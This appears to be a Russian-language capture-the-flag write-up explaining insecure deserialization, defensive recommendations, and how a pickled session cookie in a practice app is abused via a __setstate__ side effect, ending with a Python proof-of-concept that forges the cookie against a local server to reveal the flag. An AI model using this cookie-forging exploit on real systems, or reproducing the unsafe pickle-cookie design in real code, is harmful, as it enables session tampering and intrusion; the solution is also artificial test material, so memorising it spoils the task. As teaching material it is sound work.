# Real Numerology - writeup / README

## Insecure Deserialization

**Сериализация** — это преобразование объекта в последовательность байтов или другую форму хранения/передачи данных. **Десериализация** — обратный процесс, при котором из этого потока восстанавливается объект с его состоянием. Проблема начинается в тот момент, когда приложение десериализует **данные, контролируемые пользователем**: тогда атакующий может подменить содержимое сериализованного объекта, изменить его поля или даже подставить объект другого класса, если это позволяет механизм десериализации.

Именно это и называется **insecure deserialization** (небезопасная десериализация). Опасность в том, что вредоносное поведение может начаться **уже в процессе десериализации**, ещё до того, как приложение успеет выполнить какие-либо дополнительные проверки. Многие атаки завершаются до окончания десериализации, поэтому последующая валидация часто уже бесполезна.

На практике такая уязвимость может приводить к:

- подмене состояния сессии;
- повышению привилегий;
- вызову опасных методов внутри приложения;
- доступу к чужим данным;
- отказу в обслуживании;
- а в более тяжёлых случаях — к удалённому выполнению кода.

Для атакующего типичный сценарий выглядит так:

1. он находит место, где приложение принимает сериализованные данные из cookie, POST-параметра, заголовка или другого внешнего источника;
2. понимает, какой формат сериализации используется;
3. изменяет ожидаемый объект или подменяет его на другой;
4. добивается срабатывания опасной логики при десериализации или сразу после неё.

Эксплуатировать такие проблемы нередко проще, чем кажется: иногда достаточно не строить сложную gadget chain, а просто подставить объект с нужными полями или заставить вызваться специальный метод класса во время восстановления объекта.

## Способы защиты от уязвимости

Основная рекомендация [PortSwigger](https://portswigger.net/web-security/deserialization) — **не десериализовать недоверенные данные вообще, если этого можно избежать**. Для защиты от insecure deserialization в подобных проектах следует:

1. **Не использовать `pickle` для пользовательских данных**

   Для cookie, JWT-подобных структур и внешних параметров лучше использовать безопасные форматы вроде JSON и хранить в них только простые данные.

2. **Хранить в cookie только непрозрачный идентификатор сессии**

   Лучший вариант для авторизации — записывать в cookie случайный токен, а все реальные данные о пользователе хранить на сервере.

3. **Проверять целостность данных до десериализации**

   PortSwigger указывает, что если десериализация всё же необходима, контроль целостности должен выполняться **до** начала десериализации, например с помощью цифровой подписи. Проверки после `pickle.loads()` уже не защищают от побочного эффекта, который мог произойти во время восстановления объекта.

4. **Не использовать generic-десериализацию для сложных объектов**

   Чем больше логики скрыто внутри объекта, тем выше риск, что в процессе восстановления вызовутся опасные методы (`__setstate__`, `__reduce__`, `readObject`, magic methods и т.д.).

5. **Минимизировать побочные эффекты в специальных методах**

   Методы, которые могут сработать при сериализации/десериализации, не должны писать в базу, менять права, удалять файлы, запускать команды и выполнять другие чувствительные действия.

6. **Использовать defence in depth**

   Даже если десериализация убрана, полезно дополнительно ограничивать влияние ошибок: валидировать типы, отделять формат сессии от бизнес-объектов, логировать аномальные cookie и не раскрывать stack trace пользователю.

## Описание уязвимости приложения

Уязвимость находится в механизме авторизации и обработки cookie в файле `app/auth.py`.

### Где именно проблема

При входе в систему приложение создаёт объект `UserCookie`, сериализует его через `pickle`, затем кодирует в Base64 и сохраняет в cookie `session`.

Логика выглядит так:

- в `create_session()` создаётся объект `UserCookie(name=user.username, session=token)`;
- далее он сериализуется через `pickle.dumps(...)`;
- результат кладётся в cookie `session`.

При каждом последующем запросе приложение делает обратную операцию:

- читает cookie `session`;
- декодирует её через `base64.b64decode()`;
- выполняет `pickle.loads()` в функции `read_cookie_value()`.

Проблема в том, что cookie полностью контролируется пользователем. Следовательно, атакующий может отправить на сервер **не тот объект**, который приложение ожидало (`UserCookie`), а любой другой сериализованный Python-объект.

### Почему это приводит к эксплуатации

В проекте есть класс `UserGalaxyNumber`, у которого реализован метод `__setstate__()`:

```python
def __setstate__(self, state):
    self.__dict__.update(state)
    self.galaxy_number = self.calc_galaxy_number()
    self.add_to_base()
```

Во время десериализации этот метод автоматически вызывается и выполняет побочное действие: вычисляет значение `galaxy_number`, а затем вызывает `add_to_base()`, которая добавляет новую запись в таблицу `galaxy_numbers`.

То есть атакующему достаточно подставить в cookie сериализованный объект `UserGalaxyNumber` с нужными полями — и сервер сам выполнит опасную логику в ходе `pickle.loads()`.

### Как из этого получается флаг

На главной странице (`GET /`) приложение берёт **последнюю** запись из таблицы `galaxy_numbers` и передаёт её в шаблон `index.html`.

В шаблоне есть условие:

```jinja2
{% if last_galaxy_number.number == 99772 %}
    {{ flag }}
{% endif %}
```

Следовательно, атакующему нужно добиться лишь одного: сделать так, чтобы последняя записанная величина в таблице `galaxy_numbers` была равна `99772`.

Формула вычисления в `UserGalaxyNumber` такая:

```python
number_cups * 123 - number_fingers * 3 + number_age * 100
```

PoC использует значения:

- `number_cups = 811`
- `number_fingers = 27`
- `number_age = 1`

Тогда получается:

```text
811 * 123 - 27 * 3 + 1 * 100 = 99772
```

После этого при открытии главной страницы приложение показывает флаг.

## POC-эксплоит

Ниже приведён PoC-эксплоит для локального стенда.

```python
import base64
import pickle
import re

import requests

from app.auth import UserGalaxyNumber


TARGET = "http://127.0.0.1:8000/"
USERNAME = "leet_writer"


def build_payload(username: str) -> str:
    obj = UserGalaxyNumber.__new__(UserGalaxyNumber)

    obj.name = username
    obj.number_cups = 811
    obj.number_fingers = 27
    obj.number_age = 1
    obj.galaxy_number = 0

    raw = pickle.dumps(obj)
    return base64.b64encode(raw).decode()



def main():
    payload = build_payload(USERNAME)

    trigger_resp = requests.get(
        TARGET,
        cookies={"session": payload},
        timeout=10,
    )

    view_resp = requests.get(
        TARGET,
        timeout=10,
    )

    match = re.search(r"practice\{[^}]+\}", view_resp.text)
    if match:
        print("[+] FLAG:", match.group(0))
    else:
        print("[-] Флаг не найден")
        print(view_resp.text[:2000])


if __name__ == "__main__":
    main()
```
